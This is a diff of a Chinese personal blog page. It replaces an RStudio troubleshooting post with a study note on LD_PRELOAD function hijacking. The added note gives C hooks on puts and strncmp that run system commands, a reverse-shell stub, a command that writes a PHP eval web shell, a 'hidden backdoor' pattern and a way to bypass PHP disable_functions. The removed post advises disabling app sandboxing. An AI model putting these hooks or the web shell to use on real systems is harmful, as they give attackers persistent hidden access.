@@ -19,28 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="R is not appear to be installed –status 解决了但不知道为什么解决了.. 把Rstudio和R放在D盘同一个父目录下，并配置好环境变量执行Rstudio.exe却报错R is not appear to be installed 但是在无数次重装之后自动就消失了,甚至在我故意取消了环境变量之后,终端中已经无法识别Rscript之后,打开Rstudio仍然可以执">
+    <meta name="description" content="学习文章 用命令readelf -Ws &#x2F;usr&#x2F;bin&#x2F;ls看linux命令中执行了调用了哪些函数,然后再劫持这些函数 可能实现中有,但是执行时没用到, 所以多劫持几个试试 ls –&gt; strncmpwhoami –&gt; puts man 3 strncmp 可以看到函数定义 防止无穷递归12345678int strncmp(const char *s1, const char *s">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Rstudio避坑指北">
-<meta property="og:url" content="http://mekrina.github.io/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/index.html">
+<meta property="og:title" content="LD_PRELOAD劫持">
+<meta property="og:url" content="http://mekrina.github.io/blogs/uncategorized/ld-preload%E5%8A%AB%E6%8C%81/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="R is not appear to be installed –status 解决了但不知道为什么解决了.. 把Rstudio和R放在D盘同一个父目录下，并配置好环境变量执行Rstudio.exe却报错R is not appear to be installed 但是在无数次重装之后自动就消失了,甚至在我故意取消了环境变量之后,终端中已经无法识别Rscript之后,打开Rstudio仍然可以执">
+<meta property="og:description" content="学习文章 用命令readelf -Ws &#x2F;usr&#x2F;bin&#x2F;ls看linux命令中执行了调用了哪些函数,然后再劫持这些函数 可能实现中有,但是执行时没用到, 所以多劫持几个试试 ls –&gt; strncmpwhoami –&gt; puts man 3 strncmp 可以看到函数定义 防止无穷递归12345678int strncmp(const char *s1, const char *s">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio_gpu.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/chrome_no_sandbox.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/1748491873791.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/%E6%B3%A8%E5%86%8C%E8%A1%A8_open_command.png">
 <meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-05-29T04:55:00.780Z">
+<meta property="article:modified_time" content="2025-04-12T12:52:55.185Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://mekrina.github.io/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio.png">
   
   
   
-  <title>Rstudio避坑指北 - mekrina</title>
+  <title>LD_PRELOAD劫持 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -206,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Rstudio避坑指北"></span>
+            <span id="subtitle" data-typed-text="LD_PRELOAD劫持"></span>
           
         </div>
 
@@ -229,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          662 字
+          403 字
         
       </span>
     
@@ -240,7 +233,7 @@
         
         
         
-          6 分钟
+          4 分钟
         
       </span>
     
@@ -277,27 +270,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Rstudio避坑指北</h1>
+            <h1 id="seo-header">LD_PRELOAD劫持</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="R-is-not-appear-to-be-installed"><a href="#R-is-not-appear-to-be-installed" class="headerlink" title="R is not appear to be installed"></a>R is not appear to be installed</h2><p> –status 解决了但不知道为什么解决了..</p>
-<p>把Rstudio和R放在D盘同一个父目录下，并配置好环境变量<br>执行Rstudio.exe却报错<code>R is not appear to be installed</code><br><img src="/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio.png" srcset="/blogs/img/loading.gif" lazyload alt="报错"></p>
-<p>但是在无数次重装之后自动就消失了,甚至在我故意取消了环境变量之后,终端中已经无法识别<br><code>Rscript</code>之后,打开Rstudio仍然可以执行R代码,并且在Rstudio的终端中可以找到R的路径</p>
-<p>可能利用了相对路径寻找,而不是用环境变量寻找 :(</p>
-<h2 id="gpu-error"><a href="#gpu-error" class="headerlink" title="gpu error"></a>gpu error</h2><p>在解决了上述问题之后, Rstudio虽然不报错了,但是双击后一会就闪退了.<br>重装到C盘默认路径中即可解决.</p>
-<p>但是为什么在D盘就不行呢?🤔</p>
-<p>在D盘下终端执行报错<br><img src="/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/Rstudio_gpu.png" srcset="/blogs/img/loading.gif" lazyload alt="gpu error"><br>拿报错信息上网搜了下, 虽然没有rstudio对应的结果,但是却在electron项目下找到了一摸一样的<a target="_blank" rel="noopener" href="https://github.com/electron/electron/issues/37862">issue</a>, 而<code>Electron是一个使用 JavaScript、HTML 和 CSS 构建桌面应用程序的框架</code>,看来是electron项目的问题, 而用到electron的项目有很多, 在一篇解决selenium4报错gpu error的<a target="_blank" rel="noopener" href="https://blog.csdn.net/liweiweili126/article/details/129417319">文章</a>中发现加上 <code>--no-sandbox</code> 选项之后, 即可正常执行</p>
-<p>这个选项是对软件的安全限制, 默认开启, 禁止软件访问一些系统资源, 因此导致gpu error.<br>而在默认路径下,系统可能给了较高的信任度, 因此允许该位置下的软件访问资源, 所以在C盘中可以直接执行</p>
-<p>想起来之前chrome只能下载在C盘, 手动移动到D盘之后再运行也是闪退<br>尝试加上参数<code>--no-sandbox</code>果然可以执行.<br><img src="/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/chrome_no_sandbox.png" srcset="/blogs/img/loading.gif" lazyload><br>不过有警告.<br>恶意攻击者可能可以直接通过访问chrome访问系统中的重要资源</p>
-<hr>
-<p>2025.3.18</p>
-<p>虽然在桌面快捷方式中添加执行参数很容易，但是当需要双击运行rstudio的时候就需要修改注册表了。</p>
-<p>双击文件时，操作系统会根据文件后缀<code>(比如.rmd)</code>, 在注册表中查找<code>计算机\HKEY_CLASSES_ROOT\.rmd</code>, </p>
-<p><img src="/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/%E6%A0%B9%E6%8D%AE%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B.png" srcset="/blogs/img/loading.gif" lazyload alt="alt text"><br>然后操作系统就会把该文件识别为rmd_auto_file,并在路径<code>计算机\HKEY_CLASSES_ROOT\rmd_auto_file</code>中查找</p>
-<p><img src="/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/1748491873791.png" srcset="/blogs/img/loading.gif" lazyload alt="alt text"><br>右边的数据项就是资源管理器中显示的数据类型, 而shell&#x2F;open&#x2F;command下就是打开方式<br><img src="/blogs/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/%E6%B3%A8%E5%86%8C%E8%A1%A8_open_command.png" srcset="/blogs/img/loading.gif" lazyload><br>添加上–no-sandbox参数即可</p>
-<p>另外<code>计算机\HKEY_CLASSES_ROOT\.rmd</code>目录下有一个openWithList, 记录着右键打开方式,可以删除不想要的值<br>也有可能删除之后不起效果, 这时再到<code>计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.rmd\OpenWithList</code>目录下看看</p>
+                <p><a target="_blank" rel="noopener" href="https://luokuang1.github.io/2024/08/16/%E6%B5%85%E8%B0%88LD-PRELOAD%E5%8A%AB%E6%8C%81/">学习文章</a></p>
+<p>用命令<code>readelf -Ws /usr/bin/ls</code>看linux命令中执行了调用了哪些函数,然后再劫持这些函数</p>
+<p>可能实现中有,但是执行时没用到, 所以多劫持几个试试</p>
+<p><code>ls</code> –&gt; <code>strncmp</code><br><code>whoami</code> –&gt; <code>puts</code></p>
+<p>man 3 strncmp 可以看到函数定义</p>
+<h2 id="防止无穷递归"><a href="#防止无穷递归" class="headerlink" title="防止无穷递归"></a>防止无穷递归</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">strncmp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s2, <span class="hljs-type">size_t</span> n)</span>&#123;<br>    <span class="hljs-keyword">if</span>(getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="奇怪的错误"><a href="#奇怪的错误" class="headerlink" title="奇怪的错误"></a>奇怪的错误</h2><p>报segmentation fault</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>    system(<span class="hljs-string">&quot;/bin/bash -i ...&quot;</span>)<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hacked!!!&quot;</span>);  <span class="hljs-comment">// printf(&quot;hacked!!!\n&quot;); 报错!!</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">// ----------- or -----</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *message)</span> &#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack you!!!&quot;</span>);<br>  system(<span class="hljs-string">&quot;echo &#x27;&lt;?php @eval($_POST[0]);?&gt;&#x27; &gt; /var/www/html/gxngxngxn.php&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>去掉<code>\n</code>后又可以了<br>(神奇的gpt告诉我是因为printf中调用了puts, 所以递归爆栈了, \n与刷新缓冲区有关… 管他呢)</p>
+<p>getenv也会调用puts,所以用上面的方法也不行</p>
+<p>可以用static int flag作为标记,防止递归调用, 见下例</p>
+<h2 id="隐匿后门"><a href="#隐匿后门" class="headerlink" title="隐匿后门"></a>隐匿后门</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">puts</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> &#123;<br>    <span class="hljs-type">int</span> (*original_puts)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;puts&quot;</span>);<br>    <span class="hljs-type">int</span> result = original_puts(s);<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> in_hook = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (in_hook) &#123; <span class="hljs-comment">// 防止递归调用</span><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    in_hook = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;puts hooked!\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;ls&quot;</span>);<br>    in_hook = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>(爱来自gpt)<br>可以使得原来的命令正常执行,用于后门隐匿</p>
+<h2 id="so-文件加载触发"><a href="#so-文件加载触发" class="headerlink" title=".so 文件加载触发"></a>.so 文件加载触发</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br> <br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;i am hacker!!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="突破disable-function"><a href="#突破disable-function" class="headerlink" title="突破disable_function"></a>突破disable_function</h2><p>disable_function只在当前进程生效<br>mail 或 error_log函数产生一个新进程, 并执行了getuid函数<br>劫持getuid函数 或 采用加载触发即可</p>
 
                 
               </div>
@@ -305,27 +301,6 @@
             <hr/>
             <div>
               <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/blogs/categories/windows/" class="category-chain-item">windows</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
   
   
 </div>
@@ -336,8 +311,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Rstudio避坑指北</div>
-      <div>http://mekrina.github.io/blogs/windows/misc/Rstudio避坑指北/</div>
+      <div>LD_PRELOAD劫持</div>
+      <div>http://mekrina.github.io/blogs/uncategorized/ld-preload劫持/</div>
     </div>
     <div class="license-meta">
       
@@ -381,15 +356,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/windows/misc/anaconda%E6%BF%80%E6%B4%BB%E7%8E%AF%E5%A2%83%E5%90%8E%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" title="anaconda激活环境后无法执行命令">
+                      <a href="/blogs/jwt/jwt%E4%BC%AA%E9%80%A0/" title="jwt伪造">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">anaconda激活环境后无法执行命令</span>
+                        <span class="hidden-mobile">jwt伪造</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/blogs/php/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">
+                        <span class="hidden-mobile">php伪协议</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
